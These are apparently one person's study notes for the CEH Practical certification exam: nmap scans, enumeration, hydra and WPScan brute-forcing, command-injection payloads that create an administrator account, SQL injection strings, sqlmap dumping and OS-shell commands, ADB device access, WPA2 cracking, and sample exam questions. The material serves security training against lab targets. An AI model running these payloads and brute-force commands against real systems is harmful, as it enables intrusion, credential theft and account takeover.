# My ceh practical notes
#  Scanning Networks (always do sudo su) --> To be root
```
1- Nmap scan for alive/active hosts command for 192.189.19.18 - nmap -A 192.189.19.0/24 or nmap -T4 -A ip
2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command- nmap -sT -v 10.10.10.16
3- Nmap scan if firewall/IDS is opened, half scan- nmap -sS -v 10.10.10.16 
If even this the above command is not working then use this command-  namp -f 10.10.10.16
4- -A command is aggressive scan it includes - OS detection (-O), Version (-sV), Script (-sS) and traceroute (--traceroute).
5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
6- Nmap scan for host discovery or OS- nmap -O 192.168.92.10 or you can use nmap -A 192.168.92.10
7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.12.22 (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.10.10.10
9- nmap -Pn --script vuln 192.168.42.1		#Finde CVE of a target host

```
# Enumeration
```
1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
                          snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
4- DNS recon/enum-  dnsrecon -d www.google.com -z
5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 
6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
```
#  Quick Overview (Stegnography) --> Snow , Openstego
```
1- Hide Data Using Whitespace Stegnography- snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
2- To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
3- Image Stegnography using Openstego- PRACTICE ??
```
#  Sniffing
```
1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
```
#  Hacking Web Servers
```
1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
						    GET /HTTP/1.0
						    telnet www.movies.com 80
						    GET /HTTP/1.0
2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10

hydra -l user -P passlist.txt ftp://10.10.10.10
```
#  Hacking Web Application
```
1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
 						 show options
						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
						 set RHOSTS 10.10.10.10  (target ip)
						 set RPORT 8080          (target port)
						 set TARGETURI http://10.10.10.10:8080/
						 set USERNAME admin
4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
5- Command Injection-  | net user  (Find users)
 		       | dir C:\  (directory listing)
                       | net user Test/Add  (Add a user)
		       | net user Test      (Check a user)
		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
		       | net user Test      (Once again check to see if it has become administrator)
Now you can do a RDP connection with the given ip and the Test account which you created.
```
#  SQL Injections
```
1- Auth Bypass-  hi'OR 1=1 --
2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
6.1 In the shell type-   TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all os version
6.3 Use uname -a for linux to get os version
```
# Android
```
1- nmap ip -sV -p 5555    (Scan for adb port)
2- adb connect IP:5555    (Connect adb with parrot)
3- adb shell              (Access mobile device on parrot)
4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
5- sudo adb pull <source path>
6- ent <file>.elf	#eg. 1234 is low entropy, $73269362EUEROIH@#hUFH is high entropy, example for command output Entropy = 2.521641 bits per byte.
7- sha384sunm <file>.elf	#generate sha 384 hash.
```
# Wireshark
```
tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
tcp.flags.syn == 1   (Which machine for dos)
http.request.method == POST   (for passwords) or click tools ---> credentials
Also
```
# Find FQDN
```
nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
```
# Cracking Wi-Fi networks
```
Cracking Wifi Password
aircrack-ng [pcap file] (For cracking WEP network)
aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)

```
#  Some extra work 
```
Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
```


## Example of Questions: 

Question-1.   There is a machine running wamp server in the subnet. Provide the IP address of the server.

Tips:-   Scan the entire subnet with -A(aggressive scan) in nmap or use -sV(version flag). You can speed up the scan by specifying port with -p as 8080,80,443.

Suggested lecture: Scanning with nmap



Question-2.  Find the FQDN of the domain controller in the network

Tips:-   Scan the entire subnet with -A(aggressive scan) in nmap. The  FQDN will appear for the server.

Suggested lecture: Scanning with nmap



Question-3.  Identify the machine with smb enabled. Crack the smb credentials for the username given. Access an encrypted file and decode the encrypted file to retrieve the flag.

Tips:-   Scan the entire subnet for open smb ports. You can use the wordlist available on the desktop on Parrot os. Use Hydra to crack it. You can also use Metasploit to crack the password. Use Msfconsole auxiliary/scanner/smb/smb_login . The password for the encoded file is the same. If the file contains a hash, try to decode it.

Suggested lecture: smb enumeration, FTP Exploitation.



Question-4.  There is an Android device in the subnet. Identify the device. Get the files in scan folder. Provide SHA384 hash with the largest of entropy

Tips:-   Scan the entire subnet to identify android device. Use Phoesploit, pull required folder to download files, check the ectropy of all files (Detect it easy tool), and then calculate hash. (hashcalc)

Suggested lectures: Hacking Android Devices with Phonesploit over ADB, Analyze ELF Executable File using Detect It Easy (DIE), Calculating Hashes on Windows with different tools



Question-5.  Perform the vulnerability scan for the given IP address. What is the severe value of a vulnerability that indicates the end of life for a web development language platform?

Tips:-   Use Nessus to scan the target. Nessus will provide all results.

Suggested lectures: -



Question-6.  Exploit a remote login application on a Linux target in the given subnet to access a sensitive file. Enter the content of the file.

Tips:-   Use Hydra to break the password Telnet, login and access the file, and enter the flag

Suggested lectures: FTP Exploitation. telnet exploitation



Question-7.  Analyze the image file to extract the hidden message. Password is given.

Tips:-   Use Open stego to reveal the secret

Suggested lectures: Image Steganography



Question-8.  Exploit weak credentials of FTP. Obtain the hidden file

Tips:-   Use Hydra to break the password, login and access the file, and enter the flag

Suggested lectures: FTP Exploitation.



Question-9.  Escalate privilege on a Linux machine. User-level credentials are given.

Tips:-   Use polkit exploit to get the root access

Suggested lectures: Walkthrough - Escalate Privileges by Exploiting Vulnerability in pkexec



Question-10.  Find a file entry point. File is given

Tips:-   Use DIE(detect it easy) or exeinfo PE tools.

Suggested lectures: Analyze ELF Executable File using Detect It Easy (DIE), Find the Portable Executable (PE) Information of a Malware Executable File



Question-11.  From a pcap file, analyze a DDOS attack and provide the IP address that sent most packets.

Tips:-   Use Wireshark and statistics tab

Suggested lectures: Detect DDOS attack with Wireshark



Question-12.  You are provided a username/password for a website. Use SQL Injection attack to extract the password of another user.

Tips:-   Log in with the given credential. Use cookie to extract the password of a user from the table with sqlmap.

$ sqlmap -u "URL" --cookie="captured cookie of looged in user" --dbs    #for Database

$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* --tables #for Tables of selected Database

$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --colmns #for Column names

$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --dump #dump t

Suggested lectures: SQL Injection Vulnerabilities, SQL Injection Challenge (SQLMAP THM Free Room)



Question-13.  Exploit a web application at www.xxxx.com and enter the flag value from given page.

Tips:-  Find any input parameter on website and capture the request in burp and then use it to perform sql injection using sqlmap

sqlmap -r <txt file from burpsuite> -D <database name> --tables

sqlmap -r <txt file from burpsuite> -D <database name> --tables --columns

sqlmap -r <txt file from burpsuite> -D <database name> --dump

sqlmap -r <txt file from burpsuite> -D <database name> --tables -T users

Suggested lectures: SQL Injection Vulnerabilities, SQL Injection Challenge (SQLMAP THM Free Room)



Question-14.  Perform vulnerability research and exploit the target at given site.

Tips:-   Scan the target with Zapp to find the vulnerability. Then exploit it. It can be file upload/ File inclusion vulnerability on DVWA.

Suggested lectures: - DVWA file upload, File Inclusion



Question-15.  Perform SQL injection on a website and extract flag value.

Tips:-   Use sqlmap

Suggested lectures: - SQL Injection Vulnerabilities, SQL Injection Challenge (SQLMAP THM Free Room)



Question-16.  A file is available in a directory with DVWA. Access the file and enter the contents.

Tips:-   Use the file inclusion mechanism to access the file

Suggested lectures: - DVWA  File Inclusion



Question-17.  Analyze IoT traffic from a pcap file. Identify the packet with the publish message and enter the length.

Tips:- Open IOT capture file in wireshark. Filter; MQTT and find length of the packet in the lower pane

Suggested lectures: - Detect IoT traffic



Question-18.  Crack the weak credentials of wifi from a pcap file

Tips:- Use aircrack-ng to crack the password.

$ aircrack-ng '*/target file.cap*' -w */wordlist*

Suggested lectures: - Walkthrough - Perform Wireless Attacks, Crack Wifi with Aircrack



Question-19.  A RAT server is installed on a server. Connect with it and access the file.

Tips:- Scan all ports with nmap (-p-). Look for the unknown ports. Use theef RAT to connect to it.

Suggested lectures: - Create a Trojan Server using Theef RAT Trojan



Question-20.  Decrypt the veracrypt volume

Tips:- Use veracrypt to decrypt the volume.

Use veracrypt to log in the hidden drive

Password is hidden in another machine

open file

decrypt the hash and enter the contents

Suggested lectures: - Disk Encryption Using Veracrypt, Calculating Hashes on Windows with different tools
